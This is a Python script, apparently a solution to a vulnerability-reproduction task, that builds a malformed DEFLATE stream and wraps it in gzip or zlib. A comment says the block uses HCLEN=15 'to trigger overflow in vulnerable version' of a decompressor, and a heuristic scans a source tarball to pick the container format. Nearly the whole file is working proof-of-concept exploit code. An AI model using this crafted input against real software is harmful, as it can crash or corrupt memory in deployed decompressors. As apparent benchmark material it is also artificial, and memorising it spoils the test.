import tarfile
from typing import List, Tuple


class BitWriter:
    def __init__(self):
        self.buf = bytearray()
        self.bitbuf = 0
        self.bitcnt = 0

    def write(self, value: int, nbits: int):
        if nbits <= 0:
            return
        self.bitbuf |= (value & ((1 << nbits) - 1)) << self.bitcnt
        self.bitcnt += nbits
        while self.bitcnt >= 8:
            self.buf.append(self.bitbuf & 0xFF)
            self.bitbuf >>= 8
            self.bitcnt -= 8

    def finish(self) -> bytes:
        if self.bitcnt > 0:
            self.buf.append(self.bitbuf & 0xFF)
            self.bitbuf = 0
            self.bitcnt = 0
        return bytes(self.buf)


def canonical_huffman_codes(lengths: List[int]) -> List[Tuple[int, int]]:
    # lengths: list indexed by symbol, value is bit-length (0 means absent)
    # returns list of (code, length) per symbol (code meaningless if length==0)
    max_len = 0
    for l in lengths:
        if l > max_len:
            max_len = l
    bl_count = [0] * (max_len + 1)
    for l in lengths:
        if l > 0:
            bl_count[l] += 1
    next_code = [0] * (max_len + 2)
    code = 0
    for bits in range(1, max_len + 1):
        code = (code + bl_count[bits - 1]) << 1
        next_code[bits] = code
    result: List[Tuple[int, int]] = [(0, 0)] * len(lengths)
    for sym, l in enumerate(lengths):
        if l != 0:
            result[sym] = (next_code[l], l)
            next_code[l] += 1
        else:
            result[sym] = (0, 0)
    return result


def build_deflate_dynamic_block() -> bytes:
    # Construct a dynamic Huffman block that:
    # - Has HCLEN=15 (=> 19 code length codes) to trigger overflow in vulnerable version
    # - Defines code length alphabet for symbols {0,1,18} with lengths {1,2,2}
    # - HLIT=0 (257 literal/length codes), HDIST=0 (1 distance code)
    # - Lit/Len code lengths: 256 zeros, then symbol 256 has length 1
    # - Dist code lengths: 1 symbol with length 1
    # - Data: End-of-block only
    w = BitWriter()
    # BFINAL=1, BTYPE=2 (dynamic)
    w.write(1, 1)
    w.write(2, 2)
    # HLIT=0, HDIST=0, HCLEN=15
    w.write(0, 5)
    w.write(0, 5)
    w.write(15, 4)

    # Code length code order
    order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

    # We set lengths: len(0)=1, len(1)=2, len(18)=2, others=0
    cl_lengths_dict = {0: 1, 1: 2, 18: 2}
    cl_lengths = [0] * 19
    for i, sym in enumerate(order):
        cl_lengths[i] = cl_lengths_dict.get(sym, 0)

    # Emit code length code lengths (3 bits each) for all 19 (HCLEN=15)
    for i in range(19):
        w.write(cl_lengths[i], 3)

    # Build codes for code-length alphabet symbols 0..18 using assigned lengths per symbol value, not per order index
    cl_symbol_lengths = [0] * 19
    cl_symbol_lengths[0] = 1
    cl_symbol_lengths[1] = 2
    cl_symbol_lengths[18] = 2
    cl_codes = canonical_huffman_codes(cl_symbol_lengths)

    def emit_cl_symbol(sym: int):
        code, ln = cl_codes[sym]
        w.write(code, ln)

    # Now encode HLIT+HDIST code lengths (258 entries) using the code-length alphabet:
    # - First 256 zeros using two '18' repeats: 138 and 118
    emit_cl_symbol(18)     # symbol 18 => repeat zeros 11-138 times
    w.write(127, 7)        # 11 + 127 = 138
    emit_cl_symbol(18)
    w.write(107, 7)        # 11 + 107 = 118, total 256
    # Now one '1' for literal/length symbol 256
    emit_cl_symbol(1)
    # And one '1' for the single distance symbol
    emit_cl_symbol(1)

    # Now the actual data: just end-of-block (256). With only one lit/len symbol (256) of length 1,
    # the canonical code is '0' (code 0, length 1).
    w.write(0, 1)

    return w.finish()


def build_gzip(deflate_payload: bytes) -> bytes:
    # GZIP header: ID1 ID2 CM FLG MTIME(4) XFL OS
    hdr = bytearray()
    hdr.extend([0x1f, 0x8b, 0x08, 0x00])
    hdr.extend([0x00, 0x00, 0x00, 0x00])  # MTIME
    hdr.append(0x00)  # XFL
    hdr.append(0xff)  # OS (unknown)
    # Trailer: CRC32 and ISIZE of uncompressed data
    # For empty output, both are zero.
    trailer = b'\x00\x00\x00\x00\x00\x00\x00\x00'
    return bytes(hdr) + deflate_payload + trailer


def build_zlib(deflate_payload: bytes) -> bytes:
    # ZLIB header: CMF FLG with (CMF*256+FLG) % 31 == 0, CM=8, CINFO=7 (32K)
    cmf = 0x78  # 0b01111000 => CM=8, CINFO=7
    # Choose FLG such that the checksum condition holds and FDICT=0
    # Common choice 0xDA works, but compute to be safe.
    flg = 0
    for f in range(256):
        if (f & 0x20) != 0:
            continue  # FDICT must be 0
        if ((cmf << 8) | f) % 31 == 0:
            flg = f
            break
    # Adler32 of empty string is 1, big-endian
    adler = b'\x00\x00\x00\x01'
    return bytes([cmf, flg]) + deflate_payload + adler


def detect_format(src_path: str) -> str:
    gz_score = 0
    zlib_score = 0
    png_score = 0
    try:
        with tarfile.open(src_path, 'r:*') as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                # Limit read size for efficiency
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read(8192)
                data_lower = data.lower()
                # Heuristics
                if b'gzip' in data_lower or b'gunzip' in data_lower or b'\x1f\x8b' in data or b'isize' in data_lower:
                    gz_score += 1
                if b'zlib' in data_lower or b'adler' in data_lower or b'cmf' in data_lower or b'fcheck' in data_lower:
                    zlib_score += 1
                if b'png' in data_lower or b'ihdr' in data_lower or b'idat' in data_lower or b'upng' in data_lower:
                    png_score += 1
    except Exception:
        # If detection fails, fall back to gzip which is common for this task label
        return 'gzip'
    # Prefer gzip if explicitly present
    if gz_score > 0 and gz_score >= zlib_score:
        return 'gzip'
    # PNG projects generally encapsulate zlib streams
    if png_score > 0:
        return 'zlib'
    if zlib_score > 0:
        return 'zlib'
    # Default to gzip
    return 'gzip'


class Solution:
    def solve(self, src_path: str) -> bytes:
        deflate_payload = build_deflate_dynamic_block()
        fmt = detect_format(src_path)
        if fmt == 'zlib':
            return build_zlib(deflate_payload)
        elif fmt == 'gzip':
            return build_gzip(deflate_payload)
        else:
            # raw deflate
            return deflate_payload